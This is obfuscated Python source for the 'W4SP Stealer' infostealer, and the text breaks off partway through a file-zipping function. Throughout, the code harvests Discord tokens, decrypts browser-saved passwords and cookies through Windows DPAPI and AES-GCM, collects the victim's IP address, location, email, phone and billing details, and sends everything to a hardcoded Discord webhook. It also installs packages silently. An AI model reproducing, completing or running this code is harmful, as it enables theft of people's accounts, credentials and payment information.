import contextlib #line:1
import os #line:2
import threading #line:3
from sys import executable #line:4
api ="https://discord.com/api/webhooks/"#line:5
from sqlite3 import connect as sql_connect #line:6
import re #line:7
from base64 import b64decode #line:8
from json import loads as json_loads ,load #line:9
from ctypes import windll ,wintypes ,byref ,cdll ,Structure ,POINTER ,c_char ,c_buffer #line:10
from urllib .request import Request ,urlopen #line:11
from json import loads ,dumps #line:12
import time #line:13
import shutil #line:14
from zipfile import ZipFile #line:15
import random #line:16
import re #line:17
import subprocess #line:18
hook =api +"1134900464736014478/Ic3LiljrznjkdzuGojhaR-O0ZM6XHLQ7oS92aSAR2QlEVTP_eSqLARmPuU1WS0QvMoM-"#line:25
DETECTED =False #line:26
def getip ():#line:29
    O0O0OO0OOOOO00O00 ="None"#line:30
    with contextlib .suppress (Exception ):#line:31
        O0O0OO0OOOOO00O00 =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:32
    return O0O0OO0OOOOO00O00 #line:33
requirements =[["requests","requests"],["Crypto.Cipher","pycryptodome"]]#line:38
for modl in requirements :#line:39
    try :__import__ (modl [0 ])#line:40
    except :#line:41
        subprocess .Popen (f"{executable} -m pip install {modl[1]}",shell =True )#line:42
        time .sleep (3 )#line:43
import requests #line:45
from Crypto .Cipher import AES #line:46
local =os .getenv ('LOCALAPPDATA')#line:48
roaming =os .getenv ('APPDATA')#line:49
temp =os .getenv ("TEMP")#line:50
Threadlist =[]#line:51
class DATA_BLOB (Structure ):#line:54
    _fields_ =[('cbData',wintypes .DWORD ),('pbData',POINTER (c_char ))]#line:58
def GetData (O0O0O0OOO00OOO000 ):#line:60
    OOOO00O0O0000O00O =int (O0O0O0OOO00OOO000 .cbData )#line:61
    O000O0OO0OOOO0OOO =O0O0O0OOO00OOO000 .pbData #line:62
    O00O0OO00O00OO000 =c_buffer (OOOO00O0O0000O00O )#line:63
    cdll .msvcrt .memcpy (O00O0OO00O00OO000 ,O000O0OO0OOOO0OOO ,OOOO00O0O0000O00O )#line:64
    windll .kernel32 .LocalFree (O000O0OO0OOOO0OOO )#line:65
    return O00O0OO00O00OO000 .raw #line:66
def CryptUnprotectData (O00000OO00O00OOO0 ,entropy =b''):#line:68
    O0OO0OO0O0000O0OO =c_buffer (O00000OO00O00OOO0 ,len (O00000OO00O00OOO0 ))#line:69
    O0OOOO0OO0O00OO00 =c_buffer (entropy ,len (entropy ))#line:70
    OOOO0O00O00O0000O =DATA_BLOB (len (O00000OO00O00OOO0 ),O0OO0OO0O0000O0OO )#line:71
    OOOO0O0O00O0O0OO0 =DATA_BLOB (len (entropy ),O0OOOO0OO0O00OO00 )#line:72
    OO000000O00O0OOOO =DATA_BLOB ()#line:73
    if windll .crypt32 .CryptUnprotectData (byref (OOOO0O00O00O0000O ),None ,byref (OOOO0O0O00O0O0OO0 ),None ,None ,0x01 ,byref (OO000000O00O0OOOO )):#line:75
        return GetData (OO000000O00O0OOOO )#line:76
def DecryptValue (OOOOO0OOOOOO0O000 ,master_key =None ):#line:78
    OOO0O0O000O000000 =OOOOO0OOOOOO0O000 .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:79
    if OOO0O0O000O000000 in ['v10','v11']:#line:80
        O000O0OOO0OOO0O00 =OOOOO0OOOOOO0O000 [3 :15 ]#line:81
        O0O00OO0O00000O0O =OOOOO0OOOOOO0O000 [15 :]#line:82
        O0O00O0OOOOO000OO =AES .new (master_key ,AES .MODE_GCM ,O000O0OOO0OOO0O00 )#line:83
        OO0OO00OOOO0OO0OO =O0O00O0OOOOO000OO .decrypt (O0O00OO0O00000O0O )#line:84
        OO0OO00OOOO0OO0OO =OO0OO00OOOO0OO0OO [:-16 ].decode ()#line:85
        return OO0OO00OOOO0OO0OO #line:86
def LoadRequests (OO0OOO0OO000000OO ,OOO0OO0O0O0O000OO ,data ='',files ='',headers =''):#line:88
    for _OO000O00O00OOO0OO in range (8 ):#line:89
        with contextlib .suppress (Exception ):#line:90
            if OO0OOO0OO000000OO =='POST':#line:91
                if data !='':#line:92
                    OOOOO00O0O0OO0O0O =requests .post (OOO0OO0O0O0O000OO ,data =data )#line:93
                    if OOOOO00O0O0OO0O0O .status_code ==200 :#line:94
                        return OOOOO00O0O0OO0O0O #line:95
                elif files !='':#line:96
                    OOOOO00O0O0OO0O0O =requests .post (OOO0OO0O0O0O000OO ,files =files )#line:97
                    if OOOOO00O0O0OO0O0O .status_code in {200 ,413 }:#line:98
                        return OOOOO00O0O0OO0O0O #line:99
def LoadUrlib (OOOO0OO0O0O00O000 ,data ='',files ='',headers =''):#line:101
    for _O0OO0O00O0OOOO0O0 in range (8 ):#line:102
        with contextlib .suppress (Exception ):#line:103
            return (urlopen (Request (OOOO0OO0O0O00O000 ,data =data ,headers =headers ))if headers !=''else urlopen (Request (OOOO0OO0O0O00O000 ,data =data )))#line:108
def globalInfo ():#line:110
    OOO00OO000OOOOOO0 =getip ()#line:111
    O0OOOO00000O0O00O =os .getenv ("USERNAME")#line:112
    OOOOOO0OO0OOO0OO0 =urlopen (Request (f"https://geolocation-db.com/jsonp/{OOO00OO000OOOOOO0}")).read ().decode ().replace ('callback(','').replace ('})','}')#line:113
    O0OO0O0OO00O0O0OO =loads (OOOOOO0OO0OOO0OO0 )#line:115
    O00O00O00OOOOO0O0 =O0OO0O0OO00O0O0OO ["country_name"]#line:117
    O0O0OOOOO0O0O0O0O =O0OO0O0OO00O0O0OO ["country_code"].lower ()#line:118
    return f":flag_{O0O0OOOOO0O0O0O0O}:  - `{O0OOOO00000O0O00O.upper()} | {OOO00OO000OOOOOO0} ({O00O00O00OOOOO0O0})`"#line:119
def Trust (OO0O000O000O0OOOO ):#line:121
    global DETECTED #line:123
    OO000OOO0OOO00000 =str (OO0O000O000O0OOOO )#line:124
    OO00OOO0OOO0OOOO0 =re .findall (".google.com",OO000OOO0OOO00000 )#line:125
    DETECTED =len (OO00OOO0OOO0OOOO0 )<-1 #line:127
    return DETECTED #line:128
def GetUHQFriends (O0O0O0O00OOOO000O ):#line:130
    O0OO00OO0OO0O000O =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:142
    OOO0OO0O000OO0OOO ={"Authorization":O0O0O0O00OOOO000O ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:147
    try :#line:148
        OOOOOOO0OO000OO0O =loads (urlopen (Request ("https://discord.com/api/v6/users/@me/relationships",headers =OOO0OO0O000OO0OOO )).read ().decode ())#line:149
    except Exception :#line:150
        return False #line:151
    OOOO0OO0O0O000OO0 =''#line:153
    for OO0OOO0OOO0OOOOOO in OOOOOOO0OO000OO0O :#line:154
        OOOOOOO000O000OOO =''#line:155
        O0OO00OO0O0OOOOO0 =OO0OOO0OOO0OOOOOO ['user']['public_flags']#line:156
        for OO0O0000O00O00000 in O0OO00OO0OO0O000O :#line:157
            if O0OO00OO0O0OOOOO0 //OO0O0000O00O00000 ["Value"]!=0 and OO0OOO0OOO0OOOOOO ['type']==1 :#line:158
                if "House"not in OO0O0000O00O00000 ["Name"]:#line:159
                    OOOOOOO000O000OOO +=OO0O0000O00O00000 ["Emoji"]#line:160
                O0OO00OO0O0OOOOO0 =O0OO00OO0O0OOOOO0 %OO0O0000O00O00000 ["Value"]#line:161
        if OOOOOOO000O000OOO !='':#line:162
            OOOO0OO0O0O000OO0 +=f"{OOOOOOO000O000OOO} | {OO0OOO0OOO0OOOOOO['user']['username']}#{OO0OOO0OOO0OOOOOO['user']['discriminator']} ({OO0OOO0OOO0OOOOOO['user']['id']})\n"#line:163
    return OOOO0OO0O0O000OO0 #line:164
def GetBilling (O00OO00OOO00OOO00 ):#line:167
    OO0OO00OOO0OOOOO0 ={"Authorization":O00OO00OOO00OOO00 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:172
    try :#line:173
        OOO00OO0O00000OO0 =loads (urlopen (Request ("https://discord.com/api/users/@me/billing/payment-sources",headers =OO0OO00OOO0OOOOO0 )).read ().decode ())#line:174
    except Exception :#line:175
        return False #line:176
    if OOO00OO0O00000OO0 ==[]:return " -"#line:178
    O0O0O00000OOOOOOO =""#line:180
    for OO0OOOO0000OOO0OO in OOO00OO0O00000OO0 :#line:181
        if OO0OOOO0000OOO0OO ["invalid"]==False :#line:182
            if OO0OOOO0000OOO0OO ["type"]==1 :#line:183
                O0O0O00000OOOOOOO +=":credit_card:"#line:184
            elif OO0OOOO0000OOO0OO ["type"]==2 :#line:185
                O0O0O00000OOOOOOO +=":parking: "#line:186
    return O0O0O00000OOOOOOO #line:188
def GetBadge (OOO00OOO00OO0O0OO ):#line:191
    if OOO00OOO00OO0O0OO ==0 :return ''#line:192
    O0O0OO0000OOOO000 =''#line:194
    OO00OO0OOOO000OOO =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:206
    for O0O0O0O0OOOOO0000 in OO00OO0OOOO000OOO :#line:207
        if OOO00OOO00OO0O0OO //O0O0O0O0OOOOO0000 ["Value"]!=0 :#line:208
            O0O0OO0000OOOO000 +=O0O0O0O0OOOOO0000 ["Emoji"]#line:209
            OOO00OOO00OO0O0OO =OOO00OOO00OO0O0OO %O0O0O0O0OOOOO0000 ["Value"]#line:210
    return O0O0OO0000OOOO000 #line:212
def GetTokenInfo (OO00O00OOO00OOOO0 ):#line:214
    O00O0000O0OOO00O0 ={"Authorization":OO00O00OOO00OOOO0 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:219
    O0OO00O00O00O0O00 =loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =O00O0000O0OOO00O0 )).read ().decode ())#line:221
    O00O0O00O00OO00O0 =O0OO00O00O00O0O00 ["username"]#line:222
    O000O000O0O0O0O0O =O0OO00O00O00O0O00 ["discriminator"]#line:223
    OOOO00O0OO00O000O =O0OO00O00O00O0O00 ["email"]#line:224
    OO00O0O0OOO000OO0 =O0OO00O00O00O0O00 ["id"]#line:225
    OOOOO00O00OO0O00O =O0OO00O00O00O0O00 ["avatar"]#line:226
    OO0O000000O000000 =O0OO00O00O00O0O00 ["public_flags"]#line:227
    O0O0O0O000O00O000 =""#line:228
    if "premium_type"in O0OO00O00O00O0O00 :#line:229
        O0OOO0OO0OO0000O0 =O0OO00O00O00O0O00 ["premium_type"]#line:230
        if O0OOO0OO0OO0000O0 ==1 :#line:231
            O0O0O0O000O00O000 ="<:classic:896119171019067423> "#line:232
        elif O0OOO0OO0OO0000O0 ==2 :#line:233
            O0O0O0O000O00O000 ="<a:boost:824036778570416129> <:classic:896119171019067423> "#line:234
    OO000OOO00O00O000 =f'`{O0OO00O00O00O0O00["phone"]}`'if "phone"in O0OO00O00O00O0O00 else "-"#line:235
    return O00O0O00O00OO00O0 ,O000O000O0O0O0O0O ,OOOO00O0OO00O000O ,OO00O0O0OOO000OO0 ,OOOOO00O00OO0O00O ,OO0O000000O000000 ,O0O0O0O000O00O000 ,OO000OOO00O00O000 #line:236
def checkToken (O00OO0OO0OO000O00 ):#line:238
    O0OO0O00000O00O00 ={"Authorization":O00OO0OO0OO000O00 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:243
    try :#line:244
        urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =O0OO0O00000O00O00 ))#line:245
        return True #line:246
    except Exception :#line:247
        return False #line:248
def uploadToken (OO0000O0000OO0000 ,O000O0000O0OOO000 ):#line:251
    global hook #line:252
    O00O0O00OO0O00000 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:256
    O00000OO0O00000OO ,O0O000OO0O0OOOOOO ,O0OO0OOOOOO0OO000 ,O0OOOO0O0OOOOO000 ,OO00OOO00O0OO0OO0 ,OOOOO0OOOO0O00OO0 ,O00O0O00O0O0O000O ,OOO0O000OO0OO000O =GetTokenInfo (OO0000O0000OO0000 )#line:257
    if OO00OOO00O0OO0OO0 is None :#line:259
        OO00OOO00O0OO0OO0 ="https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"#line:260
    else :#line:261
        OO00OOO00O0OO0OO0 =f"https://cdn.discordapp.com/avatars/{O0OOOO0O0OOOOO000}/{OO00OOO00O0OO0OO0}"#line:262
    O00OOOO0OO0O0OO0O =GetBilling (OO0000O0000OO0000 )#line:264
    OOOO000O0OOOO0000 =GetBadge (OOOOO0OOOO0O00OO0 )#line:265
    OO00OOO0O0O0O0O0O =GetUHQFriends (OO0000O0000OO0000 )#line:266
    if OO00OOO0O0O0O0O0O =='':OO00OOO0O0O0O0O0O ="No Rare Friends"#line:267
    if not O00OOOO0OO0O0OO0O :#line:268
        OOOO000O0OOOO0000 ,OOO0O000OO0OO000O ,O00OOOO0OO0O0OO0O ="🔒","🔒","🔒"#line:269
    if O00O0O00O0O0O000O ==''and OOOO000O0OOOO0000 =='':O00O0O00O0O0O000O =" -"#line:270
    O0O0OOO0O00O00OO0 ={"content":f'{globalInfo()} | Found in `{O000O0000O0OOO000}`',"embeds":[{"color":14406413 ,"fields":[{"name":":rocket: Token:","value":f"`{OO0000O0000OO0000}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"},{"name":":envelope: Email:","value":f"`{O0OO0OOOOOO0OO000}`","inline":True },{"name":":mobile_phone: Phone:","value":f"{OOO0O000OO0OO000O}","inline":True },{"name":":globe_with_meridians: IP:","value":f"`{getip()}`","inline":True },{"name":":beginner: Badges:","value":f"{O00O0O00O0O0O000O}{OOOO000O0OOOO0000}","inline":True },{"name":":credit_card: Billing:","value":f"{O00OOOO0OO0O0OO0O}","inline":True },{"name":":clown: HQ Friends:","value":f"{OO00OOO0O0O0O0O0O}","inline":False }],"author":{"name":f"{O00000OO0O00000OO}#{O0O000OO0O0OOOOOO} ({O0OOOO0O0OOOOO000})","icon_url":f"{OO00OOO00O0OO0OO0}"},"footer":{"text":"@W4SP STEALER","icon_url":"https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"},"thumbnail":{"url":f"{OO00OOO00O0OO0OO0}"}}],"avatar_url":"https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png","username":"W4SP Stealer","attachments":[]}#line:329
    LoadUrlib (hook ,data =dumps (O0O0OOO0O00O00OO0 ).encode (),headers =O00O0O00OO0O00000 )#line:331
def Reformat (OOOOO0O000O00OOO0 ):#line:333
    O0O000OO0OO00O000 =re .findall ("(\w+[a-z])",OOOOO0O000O00OOO0 )#line:334
    while "https"in O0O000OO0OO00O000 :O0O000OO0OO00O000 .remove ("https")#line:335
    while "com"in O0O000OO0OO00O000 :O0O000OO0OO00O000 .remove ("com")#line:336
    while "net"in O0O000OO0OO00O000 :O0O000OO0OO00O000 .remove ("net")#line:337
    return list (set (O0O000OO0OO00O000 ))#line:338
def upload (OO000O0O0OO00OO0O ,OOO0O0O0OOO00OOOO ):#line:340
    O0OO0OO0000OO0O00 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:344
    if OO000O0O0OO00OO0O =="wpcook":#line:346
        OO000O0000000OOOO =' | '.join (cookiWords )#line:347
        if len (OO000O0000000OOOO )>1000 :#line:348
            O0000OO00O0O0OOOO =Reformat (str (cookiWords ))#line:349
            OO000O0000000OOOO =' | '.join (O0000OO00O0O0OOOO )#line:350
        O00OO0O0OOOOO0OO0 ={"content":globalInfo (),"embeds":[{"title":"W4SP | Cookies Stealer","description":f"**Found**:\n{OO000O0000000OOOO}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [w4spCookies.txt]({OOO0O0O0OOO00OOOO})","color":14406413 ,"footer":{"text":"@W4SP STEALER","icon_url":"https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"}}],"username":"W4SP","avatar_url":"https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png","attachments":[]}#line:367
        LoadUrlib (hook ,data =dumps (O00OO0O0OOOOO0OO0 ).encode (),headers =O0OO0OO0000OO0O00 )#line:368
        return #line:369
    if OO000O0O0OO00OO0O =="wppassw":#line:371
        O0O000O00O0OO00O0 =' | '.join (paswWords )#line:372
        if len (O0O000O00O0OO00O0 )>1000 :#line:373
            OO0OO0OOO0OOOOO0O =Reformat (str (paswWords ))#line:374
            O0O000O00O0OO00O0 =' | '.join (OO0OO0OOO0OOOOO0O )#line:375
        O00OO0O0OOOOO0OO0 ={"content":globalInfo (),"embeds":[{"title":"W4SP | Password Stealer","description":f"**Found**:\n{O0O000O00O0OO00O0}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [w4spPassword.txt]({OOO0O0O0OOO00OOOO})","color":14406413 ,"footer":{"text":"@W4SP STEALER","icon_url":"https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"}}],"username":"W4SP","avatar_url":"https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png","attachments":[]}#line:393
        LoadUrlib (hook ,data =dumps (O00OO0O0OOOOO0OO0 ).encode (),headers =O0OO0OO0000OO0O00 )#line:394
        return #line:395
    if OO000O0O0OO00OO0O =="kiwi":#line:397
        O00OO0O0OOOOO0OO0 ={"content":globalInfo (),"embeds":[{"color":14406413 ,"fields":[{"name":"Interesting files found on user PC:","value":OOO0O0O0OOO00OOOO }],"author":{"name":"W4SP | File Stealer"},"footer":{"text":"@W4SP STEALER","icon_url":"https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"}}],"username":"W4SP","avatar_url":"https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png","attachments":[]}#line:421
        LoadUrlib (hook ,data =dumps (O00OO0O0OOOOO0OO0 ).encode (),headers =O0OO0OO0000OO0O00 )#line:422
        return #line:423
def writeforfile (O000OO0000OO00OOO ,OOOO00O000O0O0OOO ):#line:436
    O00000OOO00O0O00O =os .getenv ("TEMP")+f"\wp{OOOO00O000O0O0OOO}.txt"#line:437
    with open (O00000OOO00O0O00O ,mode ='w',encoding ='utf-8')as OO000OO00OOOO000O :#line:438
        OO000OO00OOOO000O .write (f"<--W4SP STEALER ON TOP-->\n\n")#line:439
        for OO00O0O0O000O0OOO in O000OO0000OO00OOO :#line:440
            if OO00O0O0O000O0OOO [0 ]!='':#line:441
                OO000OO00OOOO000O .write (f"{OO00O0O0O000O0OOO}\n")#line:442
Tokens =''#line:444
def getToken (OO0OOOO00OOOO00OO ,O0O00O0O0000OOOO0 ):#line:445
    if not os .path .exists (OO0OOOO00OOOO00OO ):return #line:446
    OO0OOOO00OOOO00OO +=O0O00O0O0000OOOO0 #line:448
    for OO00O000000OO0O00 in os .listdir (OO0OOOO00OOOO00OO ):#line:449
        if OO00O000000OO0O00 .endswith (".log")or OO00O000000OO0O00 .endswith (".ldb"):#line:450
            for O000OOO00OO000O00 in [O00OOOOOO00O00O0O .strip ()for O00OOOOOO00O00O0O in open (f"{OO0OOOO00OOOO00OO}\\{OO00O000000OO0O00}",errors ="ignore").readlines ()if O00OOOOOO00O00O0O .strip ()]:#line:451
                for OOOOO0O00O0OO0OO0 in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",r"mfa\.[\w-]{80,95}"):#line:452
                    for OOOOOOO0OOO000OOO in re .findall (OOOOO0O00O0OO0OO0 ,O000OOO00OO000O00 ):#line:453
                        global Tokens #line:454
                        if checkToken (OOOOOOO0OOO000OOO )and OOOOOOO0OOO000OOO not in Tokens :#line:455
                            Tokens +=OOOOOOO0OOO000OOO #line:457
                            uploadToken (OOOOOOO0OOO000OOO ,OO0OOOO00OOOO00OO )#line:458
Passw =[]#line:460
def getPassw (OO00OO00OOOOOO0OO ,O0O00OO00O0OO0OO0 ):#line:461
    global Passw ,PasswCount #line:462
    if not os .path .exists (OO00OO00OOOOOO0OO ):return #line:463
    O000OO0OO00O00OO0 =OO00OO00OOOOOO0OO +O0O00OO00O0OO0OO0 +"/Login Data"#line:465
    if os .stat (O000OO0OO00O00OO0 ).st_size ==0 :return #line:466
    OO00000O0OOOOOO0O =(f"{temp}wp"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for _OO00O00OOOO000000 in range (8 ))+".db")#line:472
    shutil .copy2 (O000OO0OO00O00OO0 ,OO00000O0OOOOOO0O )#line:474
    OO0OO0OOO0OO0O000 =sql_connect (OO00000O0OOOOOO0O )#line:475
    OO00O00OOOOO0O0OO =OO0OO0OOO0OO0O000 .cursor ()#line:476
    OO00O00OOOOO0O0OO .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:477
    O0O0OOO00OO00OO0O =OO00O00OOOOO0O0OO .fetchall ()#line:478
    OO00O00OOOOO0O0OO .close ()#line:479
    OO0OO0OOO0OO0O000 .close ()#line:480
    os .remove (OO00000O0OOOOOO0O )#line:481
    O000OO000O000OO00 =f"{OO00OO00OOOOOO0OO}/Local State"#line:483
    with open (O000OO000O000OO00 ,'r',encoding ='utf-8')as OOO000O0OO00O0OO0 :OO0OOOOO000O00OO0 =json_loads (OOO000O0OO00O0OO0 .read ())#line:484
    O0O0O0OOOOOOO00O0 =b64decode (OO0OOOOO000O00OO0 ['os_crypt']['encrypted_key'])#line:485
    O0O0O0OOOOOOO00O0 =CryptUnprotectData (O0O0O0OOOOOOO00O0 [5 :])#line:486
    for OOOO00O00OOO0O0O0 in O0O0OOO00OO00OO0O :#line:488
        if OOOO00O00OOO0O0O0 [0 ]!='':#line:489
            for OO0OOOOO00000OO00 in keyword :#line:490
                OO00O000O0000OO0O =OO0OOOOO00000OO00 #line:491
                if "https"in OO0OOOOO00000OO00 :#line:492
                    O0000OO000OOOOOO0 =OO0OOOOO00000OO00 #line:493
                    OO0OOOOO00000OO00 =O0000OO000OOOOOO0 .split ('[')[1 ].split (']')[0 ]#line:494
                if OO0OOOOO00000OO00 in OOOO00O00OOO0O0O0 [0 ]and OO00O000O0000OO0O not in paswWords :#line:495
                    paswWords .append (OO00O000O0000OO0O )#line:496
            Passw .append (f"UR1: {OOOO00O00OOO0O0O0[0]} | U53RN4M3: {OOOO00O00OOO0O0O0[1]} | P455W0RD: {DecryptValue(OOOO00O00OOO0O0O0[2], O0O0O0OOOOOOO00O0)}")#line:497
            PasswCount +=1 #line:498
    writeforfile (Passw ,'passw')#line:499
Cookies =[]#line:501
def getCookie (OOO00OOO0O000O00O ,O00OO00000000O0O0 ):#line:502
    global Cookies ,CookiCount #line:503
    if not os .path .exists (OOO00OOO0O000O00O ):return #line:504
    O0OOO000O0000OOOO =OOO00OOO0O000O00O +O00OO00000000O0O0 +"/Cookies"#line:506
    if os .stat (O0OOO000O0000OOOO ).st_size ==0 :return #line:507
    O00OO0O00O0O0OOOO =(f"{temp}wp"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for _O00O000O0OO000O00 in range (8 ))+".db")#line:513
    shutil .copy2 (O0OOO000O0000OOOO ,O00OO0O00O0O0OOOO )#line:515
    O0O00OOO00OO00000 =sql_connect (O00OO0O00O0O0OOOO )#line:516
    OOOO0O0OO0000O000 =O0O00OOO00OO00000 .cursor ()#line:517
    OOOO0O0OO0000O000 .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:518
    OOOO0000O00O000OO =OOOO0O0OO0000O000 .fetchall ()#line:519
    OOOO0O0OO0000O000 .close ()#line:520
    O0O00OOO00OO00000 .close ()#line:521
    os .remove (O00OO0O00O0O0OOOO )#line:522
    OOOO0O00O00O000OO =f"{OOO00OOO0O000O00O}/Local State"#line:524
    with open (OOOO0O00O00O000OO ,'r',encoding ='utf-8')as OO0OOOOO0OO000O0O :O000OOO0O0OOOO0OO =json_loads (OO0OOOOO0OO000O0O .read ())#line:526
    OOOO0O0O000O0O0OO =b64decode (O000OOO0O0OOOO0OO ['os_crypt']['encrypted_key'])#line:527
    OOOO0O0O000O0O0OO =CryptUnprotectData (OOOO0O0O000O0O0OO [5 :])#line:528
    for OO0OO0OOO0O000O00 in OOOO0000O00O000OO :#line:530
        if OO0OO0OOO0O000O00 [0 ]!='':#line:531
            for O000OOO00OO0000OO in keyword :#line:532
                OOO0OO0O0OOOO0O0O =O000OOO00OO0000OO #line:533
                if "https"in O000OOO00OO0000OO :#line:534
                    O00OOOO0OOO00O0O0 =O000OOO00OO0000OO #line:535
                    O000OOO00OO0000OO =O00OOOO0OOO00O0O0 .split ('[')[1 ].split (']')[0 ]#line:536
                if O000OOO00OO0000OO in OO0OO0OOO0O000O00 [0 ]and OOO0OO0O0OOOO0O0O not in cookiWords :#line:537
                    cookiWords .append (OOO0OO0O0OOOO0O0O )#line:538
            Cookies .append (f"H057 K3Y: {OO0OO0OOO0O000O00[0]} | N4M3: {OO0OO0OOO0O000O00[1]} | V41U3: {DecryptValue(OO0OO0OOO0O000O00[2], OOOO0O0O000O0O0OO)}")#line:539
            CookiCount +=1 #line:540
    writeforfile (Cookies ,'cook')#line:541
def GetDiscord (O00O0O000O00O0OOO ,OOO00OO0O0OO000O0 ):#line:543
    if not os .path .exists (f"{O00O0O000O00O0OOO}/Local State"):return #line:544
    OOOO00OO00O00OO0O =O00O0O000O00O0OOO +OOO00OO0O0OO000O0 #line:546
    OOOO0O0OO000O0OOO =f"{O00O0O000O00O0OOO}/Local State"#line:548
    with open (OOOO0O0OO000O0OOO ,'r',encoding ='utf-8')as O0OOO00O0O0000OO0 :OO0OOO00O0000O0OO =json_loads (O0OOO00O0O0000OO0 .read ())#line:549
    OO000OO00OO0000O0 =b64decode (OO0OOO00O0000O0OO ['os_crypt']['encrypted_key'])#line:550
    OO000OO00OO0000O0 =CryptUnprotectData (OO000OO00OO0000O0 [5 :])#line:551
    for OO0OO0OO00O0OO0O0 in os .listdir (OOOO00OO00O00OO0O ):#line:554
        if OO0OO0OO00O0OO0O0 .endswith (".log")or OO0OO0OO00O0OO0O0 .endswith (".ldb"):#line:556
            for O00O000000O0OOOO0 in [OOO000O0OOOO00000 .strip ()for OOO000O0OOOO00000 in open (f"{OOOO00OO00O00OO0O}\\{OO0OO0OO00O0OO0O0}",errors ="ignore").readlines ()if OOO000O0OOOO00000 .strip ()]:#line:557
                for OOO00OO00OO0000OO in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",O00O000000O0OOOO0 ):#line:558
                    global Tokens #line:559
                    O0O000OO0O0OOOO0O =DecryptValue (b64decode (OOO00OO00OO0000OO .split ('dQw4w9WgXcQ:')[1 ]),OO000OO00OO0000O0 )#line:560
                    if checkToken (O0O000OO0O0OOOO0O )and O0O000OO0O0OOOO0O not in Tokens :#line:561
                        Tokens +=O0O000OO0O0OOOO0O #line:563
                        uploadToken (O0O000OO0O0OOOO0O ,O00O0O000O00O0OOO )#line:565
def GatherZips (O0O0OOOOO000O0OO0 ,O00O000000OOO0OOO ,OO0OOOO00000OOOO0 ):#line:567
    O0OOO000000OO0OO0 =[]#line:568
    for OO0O00OO00000O00O in O0O0OOOOO000O0OO0 :#line:569
        OO000OOO0O000O00O =threading .Thread (target =ZipThings ,args =[OO0O00OO00000O00O [0 ],OO0O00OO00000O00O [5 ],OO0O00OO00000O00O [1 ]])#line:570
        OO000OOO0O000O00O .start ()#line:571
        O0OOO000000OO0OO0 .append (OO000OOO0O000O00O )#line:572
    for OO0O00OO00000O00O in O00O000000OOO0OOO :#line:574
        OO000OOO0O000O00O =threading .Thread (target =ZipThings ,args =[OO0O00OO00000O00O [0 ],OO0O00OO00000O00O [2 ],OO0O00OO00000O00O [1 ]])#line:575
        OO000OOO0O000O00O .start ()#line:576
        O0OOO000000OO0OO0 .append (OO000OOO0O000O00O )#line:577
